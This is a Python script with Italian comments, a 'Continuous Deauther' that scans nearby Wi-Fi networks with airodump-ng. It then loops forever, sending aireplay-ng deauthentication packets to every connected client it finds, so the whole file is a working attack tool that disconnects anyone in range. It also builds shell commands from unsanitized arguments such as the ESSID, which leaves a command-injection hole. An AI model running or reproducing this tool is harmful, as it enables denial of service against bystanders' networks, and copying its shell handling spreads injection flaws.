import ZHOR_Modules.nicePrints as np
import ZHOR_Modules.listUtils as lu
import ZHOR_Modules.fileManager as fm
import ZHOR_Modules.listUtils as lu
import os
import argparse
import sys



# =========================================================================================================================================================
# ROBA ARGPARSE

parser = argparse.ArgumentParser(description='Continuous Deauther --- v1')
REQUIRED_ARGUMENTS = parser.add_argument_group("Argomenti necessari")
OPTIONAL_ARGUMENTS = parser.add_argument_group("Argomenti opzionali")


# === Argomenti necessari ===
REQUIRED_ARGUMENTS.add_argument('-i', metavar='\"INTERFACE\"',type=str, required=True, help='Nome della scheda su cui operare (ad es: wlan0, wlan1, ...)')
REQUIRED_ARGUMENTS.add_argument('-n', metavar='\"# DEAUTH PACKETS\"', type=int, required=True, help='Numero di pacchetti di deauth da spedire per ogni client')
REQUIRED_ARGUMENTS.add_argument('-b', metavar='\"BAND\"',type=str, required=True, help='Standard di frequenze: g = 2.4gHz, a = 5gHz')


# === Argomenti opzionali ===
#OPTIONAL_ARGUMENTS.add_argument('-x',metavar='\"VALORE OPZIONALE\"',type=str, help='Descrizione del primo valore opzionale')
#OPTIONAL_ARGUMENTS.add_argument('--qualcosAltro', action='store_true', help='Descrizione del secondo flag opzionale')
OPTIONAL_ARGUMENTS.add_argument('-t',metavar='\"SCAN TIME\"',type=int, help='Descrizione del primo valore opzionale')
OPTIONAL_ARGUMENTS.add_argument('--essid',metavar='\"ESSID\"',type=str, help='Specifica un ESSID')
OPTIONAL_ARGUMENTS.add_argument('--debug', action='store_true', help='Modalita\' debug per mostrare messaggi e informazioni aggiuntive')


args = parser.parse_args()

# =========================================================================================================================================================


np.DEBUG = ('--debug' in sys.argv)
AP_CSV_HEADER = 'BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key'
STA_CSV_HEADER = 'Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs'

# wifi cards mac addresses here 
BLACKLISTED_MACS = []

DEAUTH_PACKET_NUM = int(args.n)
WLAN_CARD = args.i
BAND = args.b

AIRODUMP_SCAN_SECONDS = 30
if ('-t' in sys.argv):
    AIRODUMP_SCAN_SECONDS = int(args.t)



# temp file
XTERM_TITLE = ''
CSV_FILE_PATH = ''
if (args.b == 'g'):
    CSV_FILE_PATH = "temp2_4g"
    XTERM_TITLE = "\"Airodump-ng 2.4ghz\""

if (args.b == 'a'):
    CSV_FILE_PATH = "temp5g"
    XTERM_TITLE = "\"Airodump-ng 5ghz\""

# composizione comando airodump
AIRODUMP_COMMAND = "\"airodump-ng {} -a -b '{}'".format(WLAN_CARD,BAND)
if ('--essid' in sys.argv):
    AIRODUMP_COMMAND += " --essid " + args.essid
    
AIRODUMP_COMMAND += " -w {}\"".format(CSV_FILE_PATH)

# =========================================================================================================================================================

def airodmupScan():
    np.debugPrint("Cancello file temporanei ...")
    os.system("rm {}*".format(CSV_FILE_PATH))

    com = "timeout {}s ".format(AIRODUMP_SCAN_SECONDS)
    com += " xterm -T {} -e {}".format(XTERM_TITLE,AIRODUMP_COMMAND)
    np.debugPrint(com)

    np.infoPrint("Eseguo scan per {} secondi ...".format(str(AIRODUMP_SCAN_SECONDS)))
    os.system(com)

def deauth(bssid: str, station: str, channel: int,essid: str):
    com = "iwconfig {} channel {}".format(WLAN_CARD,str(channel))
    np.debugPrint(com)
    os.system(com)
    
    # aireplay-ng --deauth 0 -a 9C:A2:F4:F8:4D:76 -c 94:65:2D:37:BC:11 wlan0

    com = "aireplay-ng --deauth {} -a {} -c {} {}".format(DEAUTH_PACKET_NUM,bssid,station,WLAN_CARD)
    np.debugPrint(com)
    os.system(com)


# prende una riga e restituisce una lista formattata per determinare i valori
def parseLine(line: str):        
    values = line.replace('   ',' ').replace('  ',' ').replace('\t','').replace(', ',',').strip().split(',')

    #lu.fancyPrint(values)
    #input()

    return values

# restituisce una dizionario le cui chiavi sono il BSSID e il valore è una tupla del tipo (canale, essid)
def parseAPinfo():
    lines = fm.fileToSimpleList(CSV_FILE_PATH + "-01.csv")

    # gli ap stanno tra l'index 2 e <dove sta la scritta degli STA -2>
    AP_linesIndex = 0
    for line in lines:
        if STA_CSV_HEADER in line:
            break
        else:
            AP_linesIndex += 1

    AP_lines = lines[2:AP_linesIndex - 1]



    outputDict = {}
    for l in AP_lines:
        values = parseLine(l)
        
        bssid = values[0]
        channel = values[3]
        essid = values[13]

        outputDict[bssid] = (channel,essid)

    return outputDict

# restituisce un dizionario le cui chiavi sono il macSTA e il valore è il BSSID
def parseCLinfo():
    lines = fm.fileToSimpleList(CSV_FILE_PATH + "-01.csv")

    # gli ap stanno tra l'index <dove sta la scritta degli STA -1> e la "fine -1 ""
    STA_linesIndex = 0
    for line in lines:
        if STA_CSV_HEADER in line:
            break # trovato
        else:
            STA_linesIndex += 1



    STA_lines = lines[STA_linesIndex + 1:-1]

    #lu.fancyPrint(STA_lines)
    #input()


    outputDict = {}
    for l in STA_lines:

        if '(not associated)' in l:
            pass
        else:
            values = parseLine(l)        
            bssid = values[5]
            station = values[0]
            outputDict[station] = bssid

    return outputDict

# =========================================================================================================================================================

if __name__ == '__main__':

    # controlla se sei root
    if os.geteuid() != 0:
        np.errorPrint("User is not root. Please execute this script as root or with sudo")
        exit()




    while True:
        airodmupScan()

        ap_info = parseAPinfo()    
        cl_info = parseCLinfo()
        
        #print(ap_info)
        #print(cl_info)


        if cl_info == {}:
            np.infoPrint("Nessun client connesso trovato. Vado avanti.")
        else:

            # deauth su ogni client trovato
            for clientMac in cl_info:

                try: 

                    
                    apMac = cl_info[clientMac]
                    channel = ap_info[apMac][0]
                    essid = ap_info[apMac][1]


                    if apMac in BLACKLISTED_MACS:
                        pass
                    else:
                        print("\n")
                        np.infoPrint("[SSID: {}] [AP: {}] [STA: {}] [CH: {}]".format(essid,apMac,clientMac,channel))
                        deauth(apMac,clientMac,channel,essid)

                except:
                    #np.errorPrint("[SSID: {}] [AP: {}] [STA: {}] [CH: {}] il client non è connesso al BSSID specificato (si può essere scollegato o aver cambiato BSSID)".format(essid,apMac,clientMac,channel))
                    np.errorPrint("apMac: {} clMac: {}".format(apMac,clientMac))